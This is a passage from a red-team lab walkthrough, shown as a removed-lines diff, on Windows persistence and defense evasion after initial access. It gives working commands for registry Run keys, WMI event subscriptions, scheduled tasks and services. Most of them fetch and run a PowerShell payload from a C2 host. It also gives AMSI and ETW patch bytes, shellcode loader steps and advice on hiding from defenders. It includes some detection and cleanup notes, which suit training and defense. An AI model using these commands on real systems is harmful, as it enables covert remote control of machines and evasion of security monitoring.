-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HealthCheck" /t REG_SZ /d "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -w hidden -c IEX(curl http://192.168.100.100:8080/update.ps1)\"\", 0:close\")" /f
-```
-
-## 18.5: Persistence Method 3 - Windows Service (Requires Admin)
-
-If you have local admin rights, services are powerful:
-- Run as SYSTEM (highest privileges)
-- Start automatically at boot
-- Restart on failure
-
-### 18.5.1: Create a Service Binary
-
-**You'll need a service binary. Sliver can generate one:**
-
-```bash
-# Generate a service binary
-sliver > generate beacon --http 192.168.100.100:443 --os windows --arch amd64 --format service --save /tmp/svc_update.exe
-```
-
-### 18.5.2: Transfer and Install
-
-```bash
-# Upload via Sliver
-sliver (HUNGRY_ZEBRA) > upload /tmp/svc_update.exe C:\\Windows\\Temp\\svc_update.exe
-```
-
-**Create the service:**
-
-```powershell
-# Requires admin
-sc.exe create "WindowsSecurityUpdate" binPath= "C:\Windows\Temp\svc_update.exe" start= auto DisplayName= "Windows Security Update Service"
-
-# Start it
-sc.exe start WindowsSecurityUpdate
-```
-
-**Note:** Service binaries are more likely to trigger AV. Consider using service-wrapper techniques or signing the binary.
-
-## 18.6: Persistence Method 4 - WMI Event Subscription (Advanced)
-
-**WMI subscriptions are event-driven and harder to find:**
-
-```powershell
-# Create WMI event subscription
-$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9 AND TargetInstance.Minute = 0"
-
-$FilterArgs = @{
-    Name = 'SecurityEventFilter'
-    EventNamespace = 'root/cimv2'
-    QueryLanguage = 'WQL'
-    Query = $Query
-}
-$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs
-
-$ConsumerArgs = @{
-    Name = 'SecurityEventConsumer'
-    CommandLineTemplate = 'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:8080/update.ps1'')"'
-}
-$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs
-
-$BindingArgs = @{
-    Filter = $Filter
-    Consumer = $Consumer
-}
-Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
-```
-
-**This runs every day at 9:00 AM.**
-
-## 18.7: Sliver's Built-in Persistence
-
-**Sliver has persistence commands:**
-
-```bash
-# Execute assemblies for persistence
-sliver (HUNGRY_ZEBRA) > execute-assembly /opt/tools/SharPersist.exe -t schtask -n "UpdateTask" -c "C:\Windows\System32\cmd.exe" -a "/c powershell -ep bypass -w hidden -c IEX(iwr http://192.168.100.100:8080/update.ps1)" -m add
-```
-
-## 18.8: Checking Your Persistence
-
-**Enumerate scheduled tasks:**
-```powershell
-schtasks /query /fo LIST /v | findstr /i "Task\|Run"
-```
-
-**Enumerate registry run keys:**
-```powershell
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
-```
-
-**Enumerate services (requires admin view all):**
-```powershell
-Get-Service | Where-Object {$_.Status -eq "Running"}
-```
-
-**Enumerate WMI subscriptions:**
-```powershell
-Get-WmiObject -Namespace root/subscription -Class __EventFilter
-Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
-Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
-```
-
-## 18.9: MITRE ATT&CK - Persistence Techniques
-
-| Technique ID | Name | Our Implementation |
-|-------------|------|-------------------|
-| T1053.005 | Scheduled Task | schtasks + PowerShell download |
-| T1547.001 | Registry Run Keys | HKCU Run key + encoded cmd |
-| T1543.003 | Windows Service | sc.exe create with beacon binary |
-| T1546.003 | WMI Event Subscription | __EventFilter persistence |
-
-## 18.10: Interview Question - Persistence
-
-**Q: "What persistence mechanisms would you implement after getting initial access?"**
-
-**Answer:**
-
-"My persistence strategy depends on the engagement scope and privileges:
-
-**As a regular user (most common):**
-1. **Scheduled Task**: Create a task that triggers at logon, using a name that blends in like 'WindowsHealthUpdate'. The task runs PowerShell to download a stager from my C2, bypassing AMSI in-memory.
-
-2. **Registry Run Key**: Add an entry to `HKCU\...\Run` that uses `mshta` or `powershell` to fetch my payload at login. This survives reboots.
-
-**With local admin:**
-3. **Windows Service**: Create a service with automatic start that runs my payload as SYSTEM. This gives me the highest privileges and survives reboots.
-
-4. **WMI Subscription**: Create an event subscription that triggers based on time or system events. Harder to detect than tasks/services.
-
-**Evasion considerations:**
-- Never write the actual payload to disk - always stage from C2
-- Use AMSI bypass in all PowerShell payloads
-- Use legitimate-looking names (not 'evil_backdoor')
-- Consider the noise - services are logged, tasks are logged
-- Have multiple persistence methods as backup"
-
----
-
-# PART 18: Interview Questions {#part-18-interview}
-
-These are questions you might be asked in red team or security engineer interviews.
-
-## Question 1: What is AMSI and why is it important?
-
-**Answer:**
-
-AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 that allows applications to request antimalware scans of content before execution.
-
-**Why it's important:**
-- It catches fileless attacks that bypass traditional file-based scanning
-- PowerShell, .NET, VBA, and other scripting engines use it
-- It sees the final deobfuscated script content, so encoding doesn't help
-
-**For attackers:** We must bypass AMSI to run known malicious scripts.
-**For defenders:** AMSI is a critical chokepoint to monitor.
-
----
-
-## Question 2: Explain how you would bypass AMSI.
-
-**Answer:**
-
-The most common technique is memory patching:
-
-1. Load amsi.dll using LoadLibrary
-2. Find AmsiScanBuffer using GetProcAddress
-3. Change memory protection to writable using VirtualProtect
-4. Overwrite the function start with bytes that return "clean" immediately
-5. Now all AMSI scans return success without actually scanning
-
-Patch bytes: `0xB8 0x57 0x00 0x07 0x80 0xC3`
-- `mov eax, 0x80070057` (E_INVALIDARG error code)
-- `ret` (return immediately)
-
----
-
-## Question 3: What is ETW and why should attackers care about it?
-
-**Answer:**
-
-ETW (Event Tracing for Windows) is Windows' built-in logging system. It logs:
-- Process creation
-- Network connections
-- PowerShell commands
-- .NET assembly loading
-- And hundreds of other events
-
-**Why attackers care:** Even if AMSI is bypassed, ETW logs our activities. EDR products and SIEMs consume these logs. We can be detected even without real-time blocking.
-
-**Solution:** Patch EtwEventWrite in ntdll.dll to return immediately.
-
----
-
-## Question 4: What is the difference between a beacon and a session?
-
-**Answer:**
-
-**Beacon:**
-- Checks in periodically (e.g., every 60 seconds)
-- Low and slow traffic
-- Harder to detect
-- Commands execute on next check-in (delay)
-- Better for long-term access
-
-**Session:**
-- Real-time interactive connection
-- Continuous traffic
-- Easier to detect by network monitoring
-- Commands execute immediately
-- Better for active exploitation
-
----
-
-## Question 5: Why do we encrypt shellcode?
-
-**Answer:**
-
-**Static detection bypass:**
-- Antivirus has signatures for known tools like Sliver, Cobalt Strike, Metasploit
-- Raw shellcode matches these signatures
-- Encrypted shellcode looks like random data
-- No signature match = bypass static scanning
-
-**We decrypt at runtime:** When the loader runs, it decrypts the shellcode in memory. By then, we've already bypassed AMSI, so the decrypted content isn't scanned.
-
----
-
-## Question 6: Explain PAGE_EXECUTE_READWRITE and why it's suspicious.
-
-**Answer:**
-
-PAGE_EXECUTE_READWRITE (0x40) is a memory protection flag that allows:
-- Reading the memory
-- Writing to the memory
-- Executing the memory as code
-
-**Normal programs:**
-- Code sections: PAGE_EXECUTE_READ (run but not modify)
-- Data sections: PAGE_READWRITE (modify but not run)
-
-**Why it's suspicious:**
-- Legitimate software rarely needs RWX memory
-- Shellcode loaders need to write code, then execute it
-- Security products monitor VirtualAlloc calls with 0x40
-
-**Alternative approach (more stealthy):**
-1. Allocate with PAGE_READWRITE
-2. Write shellcode
-3. Change to PAGE_EXECUTE_READ with VirtualProtect
-4. Execute
-
----
-
-## Question 7: What is position-independent code?
-
-**Answer:**
-
-Position-independent code (PIC) is code that works correctly regardless of where in memory it's loaded.
-
-**Normal programs:** Compiled to run at a specific base address. If loaded elsewhere, they need relocation fixes.
-
-**Shellcode:** We don't know where it will be injected. It must work at address 0x10000, 0x50000, or anywhere else.
-
-**How it's achieved:**
-- Avoid absolute addresses
-- Use relative addressing
-- Resolve function addresses at runtime
-
----
-
-## Question 8: Walk me through what happens when you run your loader.
-
-**Answer:**
-
-1. **Loader starts** as a normal .NET process
-2. **AMSI patch:** Load amsi.dll, find AmsiScanBuffer, make writable, overwrite with return-immediately
-3. **ETW patch:** Find EtwEventWrite in ntdll.dll, overwrite with ret
-4. **Decrypt shellcode:** XOR each byte with key 0x35
-5. **Allocate memory:** VirtualAlloc with PAGE_EXECUTE_READWRITE
-6. **Copy shellcode:** Marshal.Copy to allocated memory
-7. **Create thread:** CreateThread with lpStartAddress pointing to shellcode
-8. **Shellcode executes:** Opens HTTPS connection to C2
-9. **Beacon established:** Periodic check-in to receive commands
-10. **Wait:** WaitForSingleObject keeps process alive
-
----
-
-## Question 9: What is a C2 framework and name some popular ones.
-
-**Answer:**
-
-A C2 (Command and Control) framework is software that:
-- Generates implants/payloads
-- Listens for incoming connections
-- Provides interface to send commands
-- Manages multiple compromised systems
-
-**Popular C2 frameworks:**
-| Name | Type | Notes |
-|------|------|-------|
-| Cobalt Strike | Commercial ($3,500/year) | Most popular in real attacks |
-| Sliver | Open source | Modern, actively developed |
-| Metasploit | Open source | Widely detected, good for CTFs |
-| Havoc | Open source | Modern, Cobalt Strike alternative |
-| Mythic | Open source | Modular, multiple agents |
-| Brute Ratel | Commercial | Designed for EDR evasion |
-
----
-
-## Question 10: How would you detect this attack as a defender?
-
-**Answer:**
-
-**Detection opportunities:**
-
-1. **ETW patching:** Monitor for VirtualProtect calls on ntdll.dll
-2. **AMSI patching:** Hook AmsiScanBuffer, detect if it's modified
-3. **RWX allocation:** Alert on VirtualAlloc with PAGE_EXECUTE_READWRITE
-4. **Behavioral:** Process spawns, allocates RWX, creates thread
-5. **Network:** HTTPS beaconing patterns (periodic, same interval)
-6. **Module loading:** Unusual load of amsi.dll by non-standard processes
-7. **Event gaps:** Sudden stop of ETW events from a process
-
----
-
-## Question 11: What's the difference between User Mode and Kernel Mode?
-
-**Answer:**
-
-**User Mode (Ring 3):**
-- Normal applications run here
-- Cannot access hardware directly
-- Cannot access other processes' memory
-- Must use APIs to request services from OS
-
-**Kernel Mode (Ring 0):**
-- OS kernel and drivers run here
-- Full access to hardware
-- Can access any memory
-- No restrictions
-
-**Security implication:** Our malware runs in User Mode. We can only modify our own process (like patching AMSI in our process). We can't patch AMSI system-wide without Kernel access.
-
----
-
-## Question 12: What is DLL injection and how does it relate to what we did?
-
-**Answer:**
-
-**DLL injection:** Forcing another process to load a malicious DLL.
-
-**What we did:** Self-injection. We allocated memory in our own process, copied shellcode, and executed it. Not technically DLL injection.
-
-**True DLL injection techniques:**
-- CreateRemoteThread
-- SetWindowsHookEx
-- AppInit_DLLs
-- Process hollowing
-
-These inject into OTHER processes. More evasive (hide in legitimate process) but more complex and more detected.
-
----
-
-## Question 13: Explain XOR encryption and its weaknesses.
-
-**Answer:**
-
-**XOR encryption:** Each byte is XORed with a key.
-```
-Plaintext:  0x48
-Key:        0x35
-Encrypted:  0x48 ^ 0x35 = 0x7D
-Decrypt:    0x7D ^ 0x35 = 0x48
-```
-
-**Why we use it:**
-- Simple to implement
-- Fast
-- Defeats static signature scanning
-
-**Weaknesses:**
-- Same key throughout = vulnerable to frequency analysis
-- Known plaintext attack possible (if attacker knows some original bytes)
-- Not cryptographically secure
-
-**For our purposes:** Good enough. We just need to make the bytes look random, not defeat cryptanalysis.
-
----
-
-## Question 14: What would you do differently for a real engagement?
-
-**Answer:**
-
-1. **Stronger encryption:** AES instead of XOR
-2. **Anti-analysis:** Check for debuggers, VMs, sandboxes
-3. **Staged loading:** Download shellcode from internet, don't embed
-4. **Process injection:** Inject into legitimate process (explorer.exe)
-5. **Sleep obfuscation:** Encrypt shellcode while sleeping
-6. **Syscall evasion:** Direct syscalls instead of API calls
-7. **Unique payloads:** New encryption key per target
-8. **Domain fronting:** Use CDNs to hide C2 traffic
-9. **Parent PID spoofing:** Pretend to be spawned by legitimate process
-10. **ETW bypasses on specific providers:** Instead of blanket patch
-
----
-
-## Question 15: What's the first thing you do after getting a beacon?
-
-**Answer:**
-
-1. **Situational awareness:**
-   - `whoami` - Current user
-   - `info` - System details
-   - `ps` - Running processes (look for security tools)
-   - `ifconfig` - Network interfaces
-
-2. **Avoid detection:**
-   - Don't immediately dump credentials
-   - Understand the environment first
-   - Note security products running
-
-3. **Document everything:**
-   - Screenshot the beacon
-   - Note the timestamp
-   - Record the access method
-
-4. **Persist if authorized:**
-   - Set up backup access
-   - But only if scope allows
-
-# PART 19: Cleanup and Next Steps {#part-19-cleanup}
-
-## 19.1: Lab Cleanup
-
-**On the target Windows machine:**
-
-```powershell
-# Delete the loader
-Remove-Item C:\Temp\SliverLoader.exe -Force
-
-# Check for persistence (there shouldn't be any from our simple beacon)
-Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
-```
-
-**In Sliver:**
-
-```bash
-# Kill the beacon
-sliver > beacons
-
-# Note the beacon ID
-sliver > beacons rm <beacon-id>
-
-# Stop the listener
-sliver > jobs -k 1
-```
-
-**On Kali:**
-
-```bash
-# Remove generated files
-rm /tmp/beacon.bin
-rm /tmp/beacon_encrypted.bin
-rm /tmp/beacon_encrypted.cs
-rm -rf ~/ad-lab/loader
-```
-
-## 18.2: What's Next?
-
-Now that you have initial access, the attack chain continues:
-
-```
-[DONE] Initial Access (This walkthrough)
-   |
-   v
-[NEXT] Domain Enumeration with BloodHound
-   See: 01_domain_enumeration_bloodhound.md
-   |
-   v
-[CREDS] Credential Attacks
-   - Kerberoasting (02_kerberoasting.md)
-   - AS-REP Roasting (03_asrep_roasting.md)
-   - Credential Dumping (04_credential_dumping.md)
-   |
-   v
-[MOVE] Lateral Movement
-   - Pass the Hash (07_pass_the_hash.md)
-   - Pass the Ticket (07b_pass_the_ticket.md)
-   |
-   v
-[WIN] Domain Dominance
-   - DCSync (04b_dcsync_attack.md)
-   - Golden Ticket (08_golden_ticket.md)
-```
-
----
-
-# WALKTHROUGH COMPLETE
-
-**Congratulations!** You've completed the Initial Access walkthrough.
-
-**What you learned:**
-
-| Topic | Key Takeaway |
-|-------|-------------|
-| Computer Architecture | CPU executes instructions, RAM holds running code |
-| Windows Defender | Multiple detection layers - static, runtime, behavioral |
-| Windows APIs | How programs request services (VirtualAlloc, CreateThread, etc.) |
-| Memory Protection | PAGE_EXECUTE_READWRITE allows code injection |
-| AMSI | Script scanning - must patch to run known-bad scripts |
-| ETW | Logging - must patch to avoid detection |
-| Shellcode | Raw CPU instructions that do our bidding |
-| C2 | Infrastructure for controlling compromised machines |
-| Sliver | Open-source C2 framework |
-| The Complete Attack | From zero to shell! |
-
-**Total concepts covered:** 13 major parts with 18 sections
-
----
-
-## MITRE ATT&CK Summary Matrix
-
-```
-+---------------------------------------------------------------------+
-|                     INITIAL ACCESS ATTACK CHAIN                     |
-+---------------------------------------------------------------------+
-|                                                                     |
-|  +--------------+    +--------------+    +--------------+           |
-|  |  EXECUTION   |    |   DEFENSE    |    |    C2        |           |
-|  |              |    |   EVASION    |    |              |           |
-|  | * T1059.001  |    | * T1562.001  |    | * T1071.001  |           |
-|  |   PowerShell |    |   AMSI/ETW   |    |   HTTPS      |           |
-|  |              |    |              |    |              |           |
-|  | * T1106      |    | * T1027      |    | * T1573.002  |           |
-|  |   Native API |    |   Encryption |    |   TLS        |           |
-|  +--------------+    |              |    +--------------+           |
-|                      | * T1055      |                               |
-|                      |   Shellcode  |                               |
-|                      +--------------+                               |
-|                                                                     |
-+---------------------------------------------------------------------+
-```
-
----
-
-**Continue your journey:** [01_domain_enumeration_bloodhound.md](./01_domain_enumeration_bloodhound.md)
-
----
-
-*Document created for ORSUBANK Red Team Training Lab*
-*For authorized educational use only*
-
